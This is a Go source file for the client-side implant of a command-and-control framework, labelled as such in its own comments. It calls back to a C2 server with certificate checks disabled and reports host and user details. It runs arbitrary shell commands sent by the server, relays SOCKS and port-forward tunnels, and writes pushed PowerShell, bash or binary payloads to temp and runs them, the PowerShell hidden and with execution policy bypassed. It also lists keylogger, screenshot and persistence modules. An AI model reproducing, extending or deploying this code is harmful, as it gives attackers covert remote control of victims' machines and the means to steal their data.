package agent

import (
	"crypto/hmac"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"bty/src/go/internal/crypto"
	proto "bty/src/go/internal/proto"
	protobuf "google.golang.org/protobuf/proto"
)

// Agent is the client-side implant.
type Agent struct {
	serverAddr  string
	agentID     string
	agentVer    string

	conn        net.Conn

	// Crypto
	kp           *crypto.KeyPair
	encKey       []byte
	hmacKey      []byte
	sessionToken []byte
	serverPub    [crypto.KeySize]byte

	// State
	running         bool
	seqRx           uint32
	seqTx           uint32
	backoffBase     time.Duration
	backoffCurrent  time.Duration
	backoffMax      time.Duration

	// Tunnels (SOCKS5 / PortFwd relay)
	tunnels     map[string]net.Conn
	tunnelsMu   sync.Mutex
	writeMu     sync.Mutex

	// Modules
	modules     *ModuleRegistry
	dynModules  map[string]*DynamicModule

	// Evasion
	evasive    bool
	jitterBase time.Duration

	// Channels
	tasks   chan *proto.Task
	results chan *proto.TaskResult
}

// New creates a new agent.
func New(serverAddr string) *Agent {
	return &Agent{
		serverAddr:      serverAddr,
		agentID:         generateAgentID(),
		agentVer:        "2.0.0",
		backoffBase:     1 * time.Second,
		backoffCurrent:  1 * time.Second,
		backoffMax:      5 * time.Minute,
		evasive:        false,
		jitterBase:     5 * time.Second,
		tunnels:         make(map[string]net.Conn),
		modules:         NewModuleRegistry(),
		dynModules:      make(map[string]*DynamicModule),
		tasks:           make(chan *proto.Task, 256),
		results:         make(chan *proto.TaskResult, 256),
	}
}

// Run starts the agent main loop with reconnection.
func (a *Agent) Run() error {
	a.running = true

	for a.running {
		log.Printf("[AGENT] Connecting to %s...", a.serverAddr)

		if err := a.connect(); err != nil {
			log.Printf("[AGENT] Connection failed: %v", err)
			a.waitBackoff()
			continue
		}

		a.backoffCurrent = a.backoffBase

		if err := a.performKeyExchange(); err != nil {
			log.Printf("[AGENT] Key exchange failed: %v", err)
			a.conn.Close()
			a.waitBackoff()
			continue
		}

		if err := a.sendSessionInit(); err != nil {
			log.Printf("[AGENT] Session init failed: %v", err)
			a.conn.Close()
			a.waitBackoff()
			continue
		}

		log.Printf("[AGENT] Session established with %s", a.serverAddr)

		// Start heartbeat and task processor
		go a.heartbeatLoop()
		go a.taskProcessor()
		go a.resultSender()

		// Message loop (blocks until disconnect)
		err := a.messageLoop()

		a.conn.Close()

		if err != nil {
			log.Printf("[AGENT] Connection lost: %v", err)
			// Check if this was a kill command
			if !a.running {
				break
			}
		}

		// Reconnect with backoff
		a.waitBackoff()
	}

	log.Printf("[AGENT] Agent exited")
	return nil
}

// Stop signals the agent to stop.
func (a *Agent) Stop() {
	a.running = false
	if a.conn != nil {
		a.conn.Close()
	}
}

func (a *Agent) waitBackoff() {
	if !a.running {
		return
	}
	jitterBytes := make([]byte, 8)
	rand.Read(jitterBytes)
	jitterFactor := float64(binary.BigEndian.Uint64(jitterBytes)%1000) / 1000.0
	jitter := time.Duration(float64(a.backoffCurrent) * 0.3 * jitterFactor)
	wait := a.backoffCurrent + jitter
	log.Printf("[AGENT] Reconnecting in %v...", wait.Round(time.Millisecond))
	time.Sleep(wait)
	backoffJitterBytes := make([]byte, 8)
	rand.Read(backoffJitterBytes)
	backoffJitter := time.Duration(binary.BigEndian.Uint64(backoffJitterBytes) % uint64(a.backoffCurrent))
	a.backoffCurrent = minDuration(a.backoffCurrent*2+backoffJitter, a.backoffMax)
}

func (a *Agent) connect() error {
	host, port, _ := net.SplitHostPort(a.serverAddr)
	if host == "" {
		host = a.serverAddr
		port = "8443"
	}

	// Transport fallback: TLS → Plain TCP → HTTP → WebSocket
	transports := []struct {
		name string
		dial func() (net.Conn, error)
	}{
		{
			name: "TLS",
			dial: func() (net.Conn, error) {
				tlsConfig := &tls.Config{
					InsecureSkipVerify: true,
					MinVersion:         tls.VersionTLS12,
					ServerName:         host,
				}
				dialer := &net.Dialer{Timeout: 10 * time.Second}
				return tls.DialWithDialer(dialer, "tcp", net.JoinHostPort(host, port), tlsConfig)
			},
		},
		{
			name: "TCP",
			dial: func() (net.Conn, error) {
				return net.DialTimeout("tcp", a.serverAddr, 10*time.Second)
			},
		},
		{
			name: "HTTP",
			dial: func() (net.Conn, error) {
				httpPort := "8445"
				if p, err := func() (string, error) {
					// Try to get HTTP port from config or default
					return httpPort, nil
				}(); err == nil {
					_ = p
				}
				return net.DialTimeout("tcp", net.JoinHostPort(host, httpPort), 10*time.Second)
			},
		},
	}

	for _, t := range transports {
		conn, err := t.dial()
		if err == nil {
			log.Printf("[AGENT] Connected via %s to %s", t.name, a.serverAddr)
			a.conn = conn
			return nil
		}
		log.Printf("[AGENT] %s transport failed: %v", t.name, err)
	}

	return fmt.Errorf("all transports failed")
}

func (a *Agent) performKeyExchange() error {
	kp, err := crypto.GenerateKeyPair()
	if err != nil {
		return fmt.Errorf("generate key pair: %w", err)
	}
	a.kp = kp

	agentKE := &proto.KeyExchange{
		PublicKey:    kp.PublicKey[:],
		AgentVersion: a.agentVer,
		Transports:   []string{"tcp"},
	}

	rawInner := &proto.EnvelopeInner{
		Id:          1,
		Type:        proto.EnvelopeType_ENVELOPE_TYPE_KEY_EXCHANGE,
		Timestamp:   uint64(time.Now().UnixNano()),
		Payload:     &proto.EnvelopeInner_KeyExchange{KeyExchange: agentKE},
	}

	innerBytes, _ := protobuf.Marshal(rawInner)
	env := &proto.Envelope{
		Id:         1,
		Type:       proto.EnvelopeType_ENVELOPE_TYPE_KEY_EXCHANGE,
		Timestamp:  rawInner.Timestamp,
		Nonce:      make([]byte, crypto.NonceSize),
		Ciphertext: innerBytes,
	}

	if err := a.sendRaw(env); err != nil {
		return fmt.Errorf("send key exchange: %w", err)
	}

	// Receive server key exchange (raw)
	envData, err := a.recvBytes()
	if err != nil {
		return fmt.Errorf("recv server key exchange: %w", err)
	}

	serverEnv := &proto.Envelope{}
	if err := protobuf.Unmarshal(envData, serverEnv); err != nil {
		return fmt.Errorf("unmarshal: %w", err)
	}

	serverInner := &proto.EnvelopeInner{}
	if err := protobuf.Unmarshal(serverEnv.Ciphertext, serverInner); err != nil {
		return fmt.Errorf("unmarshal inner: %w", err)
	}

	serverKE := serverInner.GetKeyExchange()
	if len(serverKE.PublicKey) != crypto.KeySize {
		return fmt.Errorf("invalid server public key size")
	}
	copy(a.serverPub[:], serverKE.PublicKey)

	sharedSecret, err := crypto.DeriveSharedSecret(&a.kp.PrivateKey, &a.serverPub)
	if err != nil {
		return fmt.Errorf("derive shared secret: %w", err)
	}

	salt := serverKE.Padding
	if len(salt) == 0 {
		salt = nil
	}

	encKey, hmacKey, sessionToken, err := crypto.DeriveSessionKeys(sharedSecret, salt)
	if err != nil {
		return fmt.Errorf("derive session keys: %w", err)
	}

	a.encKey = encKey
	a.hmacKey = hmacKey
	a.sessionToken = sessionToken
	return nil
}

func (a *Agent) sendSessionInit() error {
	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()
	username := "unknown"
	if currentUser != nil {
		username = currentUser.Username
	}

	init := &proto.SessionInit{
		Hostname:     hostname,
		Os:           runtime.GOOS,
		Arch:         runtime.GOARCH,
		Username:     username,
		Pid:          uint32(os.Getpid()),
		IsAdmin:      isAdmin(),
		AgentId:      a.agentID,
		AgentVersion: a.agentVer,
	}

	rawInner := &proto.EnvelopeInner{
		Id:          3,
		Type:        proto.EnvelopeType_ENVELOPE_TYPE_SESSION_INIT,
		Timestamp:   uint64(time.Now().UnixNano()),
		Payload:     &proto.EnvelopeInner_SessionInit{SessionInit: init},
	}

	innerBytes, _ := protobuf.Marshal(rawInner)
	env := &proto.Envelope{
		Id:         3,
		Type:       proto.EnvelopeType_ENVELOPE_TYPE_SESSION_INIT,
		Timestamp:  rawInner.Timestamp,
		Nonce:      make([]byte, crypto.NonceSize),
		Ciphertext: innerBytes,
	}

	return a.sendRaw(env)
}

func (a *Agent) messageLoop() error {
	// Read ACK first (encrypted from server)
	_, err := a.recvEnvelope()
	if err != nil {
		return fmt.Errorf("recv ack: %w", err)
	}

	for a.running {
		inner, err := a.recvEnvelope()
		if err != nil {
			return fmt.Errorf("recv: %w", err)
		}

		switch inner.Type {
		case proto.EnvelopeType_ENVELOPE_TYPE_TASK:
			task := inner.GetTask()
			if task != nil {
				switch task.Command {
				case "kill":
					log.Printf("[AGENT] Received kill command, shutting down")
					a.Stop()
					return nil

				case "passive":
					log.Printf("[AGENT] Entering passive mode")
					return nil

				default:
					select {
					case a.tasks <- task:
					default:
						log.Printf("[AGENT] Task queue full, dropping %s", task.TaskId)
					}
				}
			}

		case proto.EnvelopeType_ENVELOPE_TYPE_DISCONNECT:
			log.Printf("[AGENT] Server requested disconnect")
			a.Stop()
			return nil

		case proto.EnvelopeType_ENVELOPE_TYPE_HEARTBEAT:
			a.sendEncrypted(proto.EnvelopeType_ENVELOPE_TYPE_HEARTBEAT,
				&proto.Heartbeat{Timestamp: uint64(time.Now().UnixNano())})
		}
	}

	return nil
}

func (a *Agent) heartbeatLoop() {
	jitterBytes := make([]byte, 8)
	rand.Read(jitterBytes)
	jitterSec := 25 + int(binary.BigEndian.Uint64(jitterBytes)%10)
	ticker := time.NewTicker(time.Duration(jitterSec) * time.Second)
	defer ticker.Stop()

	for a.running {
		select {
		case <-ticker.C:
			a.sendEncrypted(proto.EnvelopeType_ENVELOPE_TYPE_HEARTBEAT,
				&proto.Heartbeat{Timestamp: uint64(time.Now().UnixNano())})
		case <-time.After(100 * time.Millisecond):
		}
	}
}

func (a *Agent) taskProcessor() {
	for task := range a.tasks {
		if !a.running {
			return
		}
		result := a.executeTask(task)
		a.sendEncrypted(proto.EnvelopeType_ENVELOPE_TYPE_TASK_RESULT, result)
	}
}

func (a *Agent) resultSender() {
	for result := range a.results {
		if !a.running {
			return
		}
		log.Printf("[AGENT] resultSender: sending %s", result.TaskId)
		a.sendEncrypted(proto.EnvelopeType_ENVELOPE_TYPE_TASK_RESULT, result)
	}
}

func (a *Agent) executeTask(task *proto.Task) *proto.TaskResult {
	cmd := task.Command

	// Dynamic module loading
	if strings.HasPrefix(cmd, "module_load:") {
		return a.handleModuleLoad(cmd)
	}

	// Dynamic module commands
	if dm := a.findDynamicModuleCommand(cmd); dm != nil {
		return dm(cmd)
	}

	// Module commands
	if m := a.modules.Get(cmd); m != nil {
		output := m.Execute("")
		return &proto.TaskResult{TaskId: task.TaskId, Output: output, Success: true}
	}
	// Module with args (e.g. "find:*.txt")
	if idx := strings.Index(cmd, ":"); idx > 0 {
		modName := cmd[:idx]
		arg := cmd[idx+1:]
		if m := a.modules.Get(modName); m != nil {
			output := m.Execute(arg)
			return &proto.TaskResult{TaskId: task.TaskId, Output: output, Success: true}
		}
	}
	// List modules
	if cmd == "modules" {
		list := a.modules.List()
		return &proto.TaskResult{
			TaskId:  task.TaskId,
			Output:  fmt.Sprintf("Available modules: %v\n\nUse: keylogger, screenshot, persistence, ps, sysinfo, netinfo, find:pattern", list),
			Success: true,
		}
	}

	// Tunnel commands
	if strings.HasPrefix(cmd, "tunnel_open:") {
		return a.handleTunnelOpen(cmd)
	}
	if strings.HasPrefix(cmd, "tunnel_data:") {
		return a.handleTunnelData(cmd)
	}
	if strings.HasPrefix(cmd, "tunnel_close:") {
		return a.handleTunnelClose(cmd)
	}

	// SOCKS connect (legacy format)
	if strings.HasPrefix(cmd, "socks:") {
		return a.handleTunnelOpen("tunnel_open:socks:" + cmd[6:])
	}

	// Built-in commands
	if cmd == "kill" {
		a.Stop()
		return &proto.TaskResult{TaskId: task.TaskId, Output: "terminating", Success: true}
	}

	log.Printf("[AGENT] Executing: %s", task.Command)

	timeout := time.Duration(task.TimeoutSec) * time.Second
	if timeout == 0 {
		timeout = 30 * time.Second
	}

	var output []byte
	var exitCode uint32
	var errMsg string

	var cmdObj *exec.Cmd
	if runtime.GOOS == "windows" {
		cmdObj = exec.Command("cmd", "/c", task.Command)
	} else {
		cmdObj = exec.Command("sh", "-c", task.Command)
	}

	done := make(chan struct{})
	var mu sync.Mutex
	go func() {
		defer close(done)
		out, err := cmdObj.CombinedOutput()
		mu.Lock()
		output = out
		if err != nil {
			if exitErr, ok := err.(*exec.ExitError); ok {
				exitCode = uint32(exitErr.ExitCode())
			} else {
				exitCode = 1
			}
			errMsg = err.Error()
		}
		mu.Unlock()
	}()

	timer := time.AfterFunc(timeout, func() {
		if cmdObj.Process != nil {
			cmdObj.Process.Kill()
		}
	})

	select {
	case <-done:
		timer.Stop()
	case <-time.After(timeout + 2*time.Second):
		mu.Lock()
		output = []byte("task killed: command timed out and could not be terminated")
		exitCode = 124
		errMsg = "command timed out"
		mu.Unlock()
	}

	return &proto.TaskResult{
		TaskId:       task.TaskId,
		Output:       string(output),
		ExitCode:     exitCode,
		Success:      exitCode == 0,
		ErrorMessage: errMsg,
	}
}

func (a *Agent) handleTunnelOpen(cmd string) *proto.TaskResult {
	// Format: tunnel_open:ID:target
	parts := strings.SplitN(cmd, ":", 3)
	if len(parts) < 3 {
		return &proto.TaskResult{Success: false, ErrorMessage: "invalid tunnel_open format"}
	}
	id, target := parts[1], parts[2]

	log.Printf("[AGENT] Tunnel open: %s → %s", id, target)

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return &proto.TaskResult{
			TaskId: "tun-open-" + id,
			Output: fmt.Sprintf("tunnel_err:%s:%v", id, err),
			Success: false, ErrorMessage: err.Error(),
		}
	}

	a.tunnelsMu.Lock()
	a.tunnels[id] = conn
	a.tunnelsMu.Unlock()

	// Start reading from the tunnel connection
	go func() {
		buf := make([]byte, 32768)
		for a.running {
			conn.SetReadDeadline(time.Now().Add(30 * time.Second))
			n, err := conn.Read(buf)
			if err != nil {
				log.Printf("[AGENT] Tunnel %s read closed: %v", id, err)
				break
			}
			if n > 0 {
				encoded := base64.StdEncoding.EncodeToString(buf[:n])
				log.Printf("[AGENT] Tunnel %s read %d bytes, pushing to results", id, n)
				a.results <- &proto.TaskResult{
					TaskId:  "tun-data-" + id,
					Output:  fmt.Sprintf("tunnel_data:%s:%s", id, encoded),
					Success: true,
				}
			}
		}
		a.tunnelsMu.Lock()
		delete(a.tunnels, id)
		a.tunnelsMu.Unlock()
	}()

	return &proto.TaskResult{
		TaskId:  "tun-open-" + id,
		Output:  fmt.Sprintf("tunnel_ok:%s", id),
		Success: true,
	}
}

func (a *Agent) handleTunnelData(cmd string) *proto.TaskResult {
	// Format: tunnel_data:ID:base64data
	parts := strings.SplitN(cmd, ":", 3)
	if len(parts) < 3 {
		return &proto.TaskResult{Success: false, ErrorMessage: "invalid tunnel_data format"}
	}
	id, encoded := parts[1], parts[2]

	a.tunnelsMu.Lock()
	conn, ok := a.tunnels[id]
	a.tunnelsMu.Unlock()

	if !ok {
		return &proto.TaskResult{Success: false, ErrorMessage: "tunnel not found: " + id}
	}

	data, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return &proto.TaskResult{Success: false, ErrorMessage: "base64 decode failed"}
	}

	if _, err := conn.Write(data); err != nil {
		a.handleTunnelClose("tunnel_close:" + id)
		return &proto.TaskResult{Success: false, ErrorMessage: "write failed: " + err.Error()}
	}

	return &proto.TaskResult{Success: true, Output: "ok"}
}

func (a *Agent) handleTunnelClose(cmd string) *proto.TaskResult {
	// Format: tunnel_close:ID
	parts := strings.SplitN(cmd, ":", 2)
	if len(parts) < 2 {
		return &proto.TaskResult{Success: false}
	}
	id := parts[1]

	a.tunnelsMu.Lock()
	conn, ok := a.tunnels[id]
	if ok {
		delete(a.tunnels, id)
	}
	a.tunnelsMu.Unlock()

	if ok {
		conn.Close()
		log.Printf("[AGENT] Tunnel closed: %s", id)
	}

	return &proto.TaskResult{Success: true, Output: "closed"}
}

// --- Network helpers ---

func (a *Agent) sendEncrypted(msgType proto.EnvelopeType, payload protobuf.Message) error {
	a.writeMu.Lock()
	defer a.writeMu.Unlock()
	inner := &proto.EnvelopeInner{
		Id:           a.nextTxSeq(),
		Type:         msgType,
		Timestamp:    uint64(time.Now().UnixNano()),
		SessionToken: a.sessionToken,
	}

	switch msgType {
	case proto.EnvelopeType_ENVELOPE_TYPE_TASK_RESULT:
		inner.Payload = &proto.EnvelopeInner_TaskResult{TaskResult: payload.(*proto.TaskResult)}
	case proto.EnvelopeType_ENVELOPE_TYPE_HEARTBEAT:
		inner.Payload = &proto.EnvelopeInner_Heartbeat{Heartbeat: payload.(*proto.Heartbeat)}
	case proto.EnvelopeType_ENVELOPE_TYPE_RECONNECT:
		inner.Payload = &proto.EnvelopeInner_Heartbeat{Heartbeat: payload.(*proto.Heartbeat)}
	default:
		return fmt.Errorf("unsupported type: %v", msgType)
	}

	innerBytes, _ := protobuf.Marshal(inner)
	encrypted, err := crypto.Encrypt(a.encKey, innerBytes)
	if err != nil {
		return fmt.Errorf("encrypt: %w", err)
	}

	envelope := &proto.Envelope{
		Id:           inner.Id,
		Type:         msgType,
		Timestamp:    inner.Timestamp,
		SessionToken: a.sessionToken,
		Nonce:        encrypted[:crypto.NonceSize],
		Ciphertext:   encrypted[crypto.NonceSize:],
	}

	envBytes, _ := protobuf.Marshal(envelope)
	return a.sendBytes(envBytes)
}

func (a *Agent) recvEnvelope() (*proto.EnvelopeInner, error) {
	envData, err := a.recvBytes()
	if err != nil {
		return nil, err
	}

	envelope := &proto.Envelope{}
	if err := protobuf.Unmarshal(envData, envelope); err != nil {
		return nil, fmt.Errorf("unmarshal: %w", err)
	}

	encrypted := make([]byte, len(envelope.Nonce)+len(envelope.Ciphertext))
	copy(encrypted[:crypto.NonceSize], envelope.Nonce)
	copy(encrypted[crypto.NonceSize:], envelope.Ciphertext)

	decrypted, err := crypto.Decrypt(a.encKey, encrypted)
	if err != nil {
		return nil, fmt.Errorf("decrypt: %w", err)
	}

	inner := &proto.EnvelopeInner{}
	if err := protobuf.Unmarshal(decrypted, inner); err != nil {
		return nil, fmt.Errorf("unmarshal inner: %w", err)
	}

	if !hmac.Equal(inner.SessionToken, a.sessionToken) {
		return nil, fmt.Errorf("invalid session token")
	}
	a.seqRx++

	return inner, nil
}

func (a *Agent) sendRaw(env *proto.Envelope) error {
	envBytes, _ := protobuf.Marshal(env)
	return a.sendBytes(envBytes)
}

func (a *Agent) sendBytes(data []byte) error {
	lengthBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(lengthBuf, uint32(len(data)))
	if _, err := a.conn.Write(lengthBuf); err != nil {
		return err
	}
	_, err := a.conn.Write(data)
	return err
}

func (a *Agent) recvBytes() ([]byte, error) {
	lengthBuf := make([]byte, 4)
	if _, err := readFull(a.conn, lengthBuf); err != nil {
		return nil, err
	}
	length := binary.BigEndian.Uint32(lengthBuf)
	if length > 100*1024*1024 {
		return nil, fmt.Errorf("message too large: %d", length)
	}
	data := make([]byte, length)
	if _, err := readFull(a.conn, data); err != nil {
		return nil, err
	}
	return data, nil
}

func (a *Agent) nextTxSeq() uint32 {
	a.seqTx++
	return a.seqTx
}

// --- Helpers ---

func readFull(conn net.Conn, buf []byte) (int, error) {
	total := 0
	for total < len(buf) {
		n, err := conn.Read(buf[total:])
		if err != nil {
			return total, err
		}
		if n == 0 {
			return total, fmt.Errorf("connection closed")
		}
		total += n
	}
	return total, nil
}

func generateAgentID() string {
	b := make([]byte, 8)
	rand.Read(b)
	return fmt.Sprintf("agent-%x", b)
}

func isAdmin() bool {
	if runtime.GOOS == "windows" {
		return false
	}
	return os.Geteuid() == 0
}

func minDuration(a, b time.Duration) time.Duration {
	if a < b {
		return a
	}
	return b
}

// contextWithTimeout provides a simple context-like timeout without importing context package
func contextWithTimeout(d time.Duration) (chan struct{}, func()) {
	ch := make(chan struct{})
	timer := time.AfterFunc(d, func() { close(ch) })
	return ch, func() { timer.Stop() }
}

// DynamicModule is a module pushed from the C2 at runtime.
type DynamicModule struct {
	Name        string
	Version     string
	Platform    string
	Description string
	Type        string // "ps1", "sh", "binary"
	Commands    []string
	Payload     []byte
}

func (a *Agent) handleModuleLoad(cmd string) *proto.TaskResult {
	// Format: module_load:<base64 json>
	parts := strings.SplitN(cmd, ":", 2)
	if len(parts) < 2 {
		return &proto.TaskResult{Success: false, ErrorMessage: "invalid module_load format"}
	}

	data, err := base64.StdEncoding.DecodeString(parts[1])
	if err != nil {
		return &proto.TaskResult{Success: false, ErrorMessage: "base64 decode failed: " + err.Error()}
	}

	var packed struct {
		Manifest struct {
			Name        string `json:"name"`
			Version     string `json:"version"`
			Platform    string `json:"platform"`
			Description string `json:"description"`
			Type        string `json:"type"`
			Commands    []string `json:"commands"`
		} `json:"manifest"`
		Payload string `json:"payload"`
	}

	if err := json.Unmarshal(data, &packed); err != nil {
		return &proto.TaskResult{Success: false, ErrorMessage: "json parse failed: " + err.Error()}
	}

	payload, _ := base64.StdEncoding.DecodeString(packed.Payload)

	dm := &DynamicModule{
		Name:        packed.Manifest.Name,
		Version:     packed.Manifest.Version,
		Platform:    packed.Manifest.Platform,
		Description: packed.Manifest.Description,
		Type:        packed.Manifest.Type,
		Commands:    packed.Manifest.Commands,
		Payload:     payload,
	}

	a.dynModules[dm.Name] = dm

	log.Printf("[AGENT] Module loaded: %s v%s (%s, %d bytes)", dm.Name, dm.Version, dm.Type, len(payload))

	return &proto.TaskResult{
		Success: true,
		Output:  fmt.Sprintf("Module '%s' v%s loaded — commands: %v", dm.Name, dm.Version, dm.Commands),
	}
}

// findDynamicModuleCommand checks if a command matches a loaded dynamic module.
func (a *Agent) findDynamicModuleCommand(cmd string) func(string) *proto.TaskResult {
	cmdName := cmd
	if idx := strings.Index(cmd, " "); idx > 0 {
		cmdName = cmd[:idx]
	}
	for _, dm := range a.dynModules {
		for _, c := range dm.Commands {
			if c == cmdName {
				return func(s string) *proto.TaskResult {
					args := ""
					if idx := strings.Index(s, " "); idx > 0 {
						args = s[idx+1:]
					}
					return a.ExecDynamicModule(dm.Name, args)
				}
			}
		}
	}
	return nil
}

// ExecDynamicModule executes a dynamically loaded module command.
func (a *Agent) ExecDynamicModule(name, args string) *proto.TaskResult {
	dm, ok := a.dynModules[name]
	if !ok {
		return &proto.TaskResult{Success: false, ErrorMessage: "module not loaded: " + name}
	}

	switch dm.Type {
	case "ps1":
		return a.execPowerShellModule(dm.Payload, args)
	case "sh":
		return a.execBashModule(dm.Payload, args)
	case "binary":
		return a.execBinaryModule(dm.Payload, args)
	default:
		return &proto.TaskResult{Success: false, ErrorMessage: "unsupported module type: " + dm.Type}
	}
}

func (a *Agent) execPowerShellModule(payload []byte, args string) *proto.TaskResult {
	if runtime.GOOS != "windows" {
		return &proto.TaskResult{Success: false, ErrorMessage: "PowerShell modules require Windows"}
	}
	// Write payload to temp, execute with PowerShell
	tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf("bty_%x.ps1", time.Now().UnixNano()))
	if err := os.WriteFile(tmpFile, payload, 0600); err != nil {
		return &proto.TaskResult{Success: false, ErrorMessage: "write temp: " + err.Error()}
	}
	defer os.Remove(tmpFile)

	cmd := exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", tmpFile, "-Args", args)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return &proto.TaskResult{Success: false, Output: string(out), ErrorMessage: err.Error()}
	}
	return &proto.TaskResult{Success: true, Output: string(out)}
}

func (a *Agent) execBashModule(payload []byte, args string) *proto.TaskResult {
	if runtime.GOOS == "windows" {
		return &proto.TaskResult{Success: false, ErrorMessage: "Bash modules require Linux/macOS"}
	}
	tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf("bty_%x.sh", time.Now().UnixNano()))
	if err := os.WriteFile(tmpFile, payload, 0700); err != nil {
		return &proto.TaskResult{Success: false, ErrorMessage: "write temp: " + err.Error()}
	}
	defer os.Remove(tmpFile)

	cmd := exec.Command("bash", tmpFile, args)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return &proto.TaskResult{Success: false, Output: string(out), ErrorMessage: err.Error()}
	}
	return &proto.TaskResult{Success: true, Output: string(out)}
}

func (a *Agent) execBinaryModule(payload []byte, args string) *proto.TaskResult {
	tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf("bty_%x", time.Now().UnixNano()))
	if runtime.GOOS == "windows" {
		tmpFile += ".exe"
	}
	if err := os.WriteFile(tmpFile, payload, 0700); err != nil {
		return &proto.TaskResult{Success: false, ErrorMessage: "write temp: " + err.Error()}
	}
	defer os.Remove(tmpFile)

	cmd := exec.Command(tmpFile, args)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return &proto.TaskResult{Success: false, Output: string(out), ErrorMessage: err.Error()}
	}
	return &proto.TaskResult{Success: true, Output: string(out)}
}

var _ = fmt.Sprintf
